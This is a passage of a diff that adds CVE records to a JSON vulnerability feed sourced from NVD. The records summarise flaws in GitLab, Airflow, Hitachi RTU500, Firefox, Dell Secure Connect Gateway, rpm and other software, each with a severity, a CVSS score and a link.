+      "desc": "GitLab has remediated an issue in GitLab CE/EE affecting all versions from 13.11 before 19.2.7, 19.3 before 19.3.3, and 19.4 before 19.4.1 that under certain conditions could have allowed an authenticated user to execute arbitrary JavaScript in the context of another user's browser session due to improper sanitization of path components in the merge request diff viewer.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-84739",
+      "cvss": "8.7",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-86843",
+      "desc": "The Apache Airflow Teradata provider's compute-cluster example Dag declared every one of its Dag Params as unconstrained free text and templated them straight into the compute-cluster operators, which interpolate those values into Teradata DDL. A user who is permitted to trigger that Dag - a lower-trust role than the Dag author, and one that needs no Teradata credentials of its own - could therefore supply SQL fragments that execute under the connection the task runs as, and could additionally redirect the task at any other connection defined in the deployment, because the connection id was itself a free-text Param. Only deployments that run this example Dag, or a Dag copied from it, are affected; the provider's operator code is unchanged. Users of apache-airflow-providers-teradata are recommended to upgrade to version 3.7.0 or later, whose example constrains the Params to validated identifiers and a closed value set and removes connection selection and free-form option strings from trigger-time input. Upgrading does not change a Dag already copied from the example; users who copied it should apply the same constraints to their copy.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-86843",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-8065",
+      "desc": "An authentication bypass vulnerability in the firmware update endpoint of Hitachi Energy RTU500 end-of-life versions allows an unauthenticated attacker to upload arbitrary firmware through a crafted POST request. Successful exploitation could allow the attacker to modify device functionality or compromise the integrity or availability of the device.",
+      "severity": "CRITICAL",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-8065",
+      "cvss": "9.1",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-8066",
+      "desc": "A directory traversal vulnerability in the file upload functionality of Hitachi Energy RTU500 end-of-life versions allows an unauthenticated attacker to write or overwrite arbitrary files on the device file system. Depending on the files affected, successful exploitation could result in unauthorized modification of device data or disruption of the device’s intended operation.",
+      "severity": "CRITICAL",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-8066",
+      "cvss": "9.1",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-8067",
+      "desc": "An improper authorization vulnerability in the end-of-life versions of RTU500’s web application allows an authenticated user to trigger the RTU500 to reboot through the reset endpoint. Successful exploitation could cause temporary device unavailability and disruption of its intended operation.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-8067",
+      "cvss": "6.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-8937",
+      "desc": "GitLab has remediated an issue in GitLab CE/EE affecting all versions from 19.0 before 19.2.7, 19.3 before 19.3.3, and 19.4 before 19.4.1 that under certain conditions could have allowed an authenticated user to read private child issue contents, including titles and descriptions, from projects they had no access to, due to missing authorization checks on linked work items within visible epics.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-8937",
+      "cvss": "4.3",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-95386",
+      "desc": "TTL file parser infinite loop in 4.6.0 to 4.6.8 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-95386",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-95387",
+      "desc": "SPDY protocol dissector crash in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-95387",
+      "cvss": "8.1",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-95388",
+      "desc": "Sharkd utility crash in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-95388",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-95389",
+      "desc": "SCTP protocol dissector crash in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-95389",
+      "cvss": "8.1",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-95390",
+      "desc": "PEAK CAN TRC file parser crash in 4.6.0 to 4.6.8 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-95390",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-95391",
+      "desc": "ZigBee ZCL protocol dissector crash in 4.6.0 to 4.6.8 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-95391",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-95392",
+      "desc": "MBIM protocol dissector crash in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-95392",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-95393",
+      "desc": "CSN.1 protocol dissector crash in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-95393",
+      "cvss": "4.7",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-95394",
+      "desc": "Microsoft Network Monitor file parser large loop in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-95394",
+      "cvss": "4.7",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-95395",
+      "desc": "IEEE C37.118 Synchrophasor protocol dissector memory leak in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-95395",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96415",
+      "desc": "Catapult DCT2000 protocol dissector crash in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96415",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96416",
+      "desc": "IEEE 802.11 protocol dissector crash in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96416",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96417",
+      "desc": "RF4CE protocol dissector crash in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96417",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96418",
+      "desc": "TIFF protocol dissector infinite loop in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96418",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96419",
+      "desc": "Profile import crash in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service and possible code execution",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96419",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96420",
+      "desc": "Toshiba file parser crash in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96420",
+      "cvss": "4.7",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96421",
+      "desc": "USB HID protocol dissector infinite loop and memory leak in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96421",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96422",
+      "desc": "Frame protocol metadissector crash in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96422",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-96423",
+      "desc": "X11 protocol dissector crash in 4.6.0 to 4.6.8 and 4.4.0 to 4.4.18 allows denial of service",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-96423",
+      "cvss": "5.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-95509",
+      "desc": "Strings optimized for Latin-1 displaying Latin-1 characters cause incorrect String.arg() formatting by an incorrect buffer size calculation, causing out-of-bounds reading.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-95509",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-101266",
+      "desc": "A logic flaw in the checkout flow allows users to bypass validations performed during the check-in by skipping entire check-in steps.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-101266",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-102495",
+      "desc": "Apache XmlSchema doesn't limit how deeply schema imports and includes can be nested, so a malicious schema can make parsing recurse until the stack overflows. This causes a denial of service.\nUsers are recommended to upgrade to version 2.3.3, which fixes this issue.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-102495",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-102496",
+      "desc": "Apache XmlSchema doesn't limit how deeply schema structures can be nested when it builds its schema model, so a malicious schema can make parsing recurse until the stack overflows. This causes a denial of service.\nUsers are recommended to upgrade to version 2.3.3, which fixes this issue.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-102496",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-102497",
+      "desc": "The Apache XmlSchema walker (xmlschema-walker) doesn't detect cycles in type derivation, substitution groups, model groups or attribute groups. A malicious schema with such a cycle can make the walker recurse until the stack overflows, causing a denial of service.\n\nUsers are recommended to upgrade to version 2.3.3, which fixes this issue.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-102497",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-102507",
+      "desc": "Sliver C2 framework version 1.7.7 and earlier contains an unhandled panic vulnerability in the operator gRPC handler that allows an attacker controlling a compromised implant to crash the entire teamserver by returning a malformed or empty Download response. Attackers can send zero-length or 1-3 byte data payloads through a hostile implant session to trigger an out-of-bounds slice access in the vendored Binject library's BinaryMagic function, which propagates unrecovered through the operator gRPC interceptor chain and terminates the server process, affecting all connected operators.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-102507",
+      "cvss": "5.7",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-41875",
+      "desc": "Quick.Cart is vulnerable to Cross-Site Request Forgery in admin config panel. Malicious attacker can craft special website, which when visited by the admin, will automatically send a POST request that changes admin's login and password.\nThis software does implement simple protection against this type of attack, but it is easily bypassed by manipulating the referer header. All forms available in this software are potentially vulnerable.\n\nThis issue was fixed in a patch to version 6.7 published on 09.11.2026, deployments without this patch are still vulnerable",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-41875",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-66083",
+      "desc": "The /datasources/unauth-datasource endpoint does not properly enforce data source authorization. An authenticated user can invoke this endpoint to obtain information about data sources they are not authorized to access. This may expose data source configuration and other sensitive metadata, depending on the fields returned by the endpoint.\n\n\n\nThis issue affects Apache DolphinScheduler: before 3.4.3.\n\n\n\nUsers are recommended to upgrade to version 3.4.3, which fixes the issue.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-66083",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-73593",
+      "desc": "Dell Secure Connect Gateway (SCG) Policy Manager, versions prior to 5.34.00.16, contains an Active Debug Code vulnerability. A high privileged attacker with local access could potentially exploit this vulnerability, leading to Information disclosure, Information tampering, Protection mechanism bypass, and Unauthorized access.",
+      "severity": "LOW",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73593",
+      "cvss": "3.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-73594",
+      "desc": "Dell Secure Connect Gateway (SCG) Policy Manager, versions prior to 5.34.00.16, Versions prior to 5.36, contains an Improper Certificate Validation vulnerability. An unauthenticated attacker with adjacent network access could potentially exploit this vulnerability, leading to Information disclosure, Information tampering, and Protection mechanism bypass.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73594",
+      "cvss": "6.4",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-73595",
+      "desc": "Dell Secure Connect Gateway (SCG) Policy Manager, versions prior to 5.34.00.16, Versions prior to 5.36, contains a Download of Code Without Integrity Check vulnerability. An unauthenticated attacker with remote access could potentially exploit this vulnerability, leading to Code execution, Information disclosure, Information tampering, and Protection mechanism bypass.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73595",
+      "cvss": "4.7",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-73596",
+      "desc": "Dell Secure Connect Gateway (SCG) Policy Manager, versions prior to 5.34.00.16, contains an Initialization of a Resource with an Insecure Default vulnerability. A high privileged attacker with remote access could potentially exploit this vulnerability, leading to Elevation of privileges, Information tampering, Protection mechanism bypass, and Unauthorized access.",
+      "severity": "LOW",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73596",
+      "cvss": "3.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-73597",
+      "desc": "Dell Secure Connect Gateway (SCG) Policy Manager, versions prior to 5.34.00.16, contains a Cross-Site Request Forgery (CSRF) vulnerability. An unauthenticated attacker with remote access could potentially exploit this vulnerability, leading to Information disclosure, Information tampering, Launch of phishing attacks, and Protection mechanism bypass.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73597",
+      "cvss": "6.5",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-85520",
+      "desc": "Google Merchant Center Feed (gmfeed) module for PrestaShop is vulnerable to unauthenticated arbitrary file write in the feed.php endpoint. An unauthenticated attacker can send a crafted request that controls the output file name, path, extension, and content through request parameters. Due to the lack of authentication and input validation, the request is processed successfully, allowing an attacker to write and execute arbitrary PHP code, resulting in remote code execution (RCE).\n\n\nThis issue was fixed in version 2.3.9.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-85520",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-87748",
+      "desc": "Missing Authorization vulnerability in Interprobe Information Technologies Inc. Qorela DC allows Privilege Abuse.\n\nThis issue affects Qorela DC: from 1.6.1-RC29 before v1.6.2.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-87748",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-95520",
+      "desc": "A heap-based buffer overflow flaw was found in rpm. Parsing a symlink entry in an untrusted RPM package whose declared RPMTAG_LONGFILESIZES value is 0xFFFFFFFFFFFFFFFF causes an integer overflow in iterReadArchiveNext() that shrinks a buffer allocation to one byte, after which the payload's independently-controlled cpio filesize field is used to write attacker-controlled data past the end of that allocation. This is reachable via rpm2cpio, rpm2archive, and rpm -qlvp on an  untrusted package.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-95520",
+      "cvss": "7.1",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100756",
+      "desc": "Incorrect boundary conditions in the Audio/Video: Playback component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100756",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100757",
+      "desc": "Use-after-free in the Widget component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100757",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100758",
+      "desc": "Sandbox escape in the DOM: Navigation component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100758",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100759",
+      "desc": "Uninitialized memory in the Storage: Quota Manager component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100759",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100760",
+      "desc": "Sandbox escape in the Security: Process Sandboxing component. This vulnerability was fixed in Firefox ESR 153.4 and Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100760",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100761",
+      "desc": "Privilege escalation due to use-after-free in the Graphics: WebGPU component. This vulnerability was fixed in Firefox 157.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100761",
+      "cvss": "8.8",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100762",
+      "desc": "Sandbox escape due to use-after-free in the DOM: Content Processes component. This vulnerability was fixed in Firefox ESR 153.4, Firefox 157, Firefox ESR 115.42, and Firefox ESR 140.17.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100762",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100763",
+      "desc": "Incorrect boundary conditions in the Graphics: WebGPU component. This vulnerability was fixed in Firefox 157.",
+      "severity": "MEDIUM",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100763",
+      "cvss": "0.0",
+      "cwe": ""
+    },
+    {
+      "id": "CVE-2026-100764",
+      "desc": "Privilege escalation due to incorrect boundary conditions in the Graphics: WebGPU component. This vulnerability was fixed in Firefox 157.",
+      "severity": "HIGH",
+      "source": "NVD/NIST",
+      "date": "2026-09-29",
+      "pakistan": false,
+      "zeroday": false,
+      "tags": [
+        "nvd",
+        "cve",
+        "vulnerability",
+        "CVE Vulnerability"
+      ],
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-100764",
+      "cvss": "8.8",
+      "cwe": ""
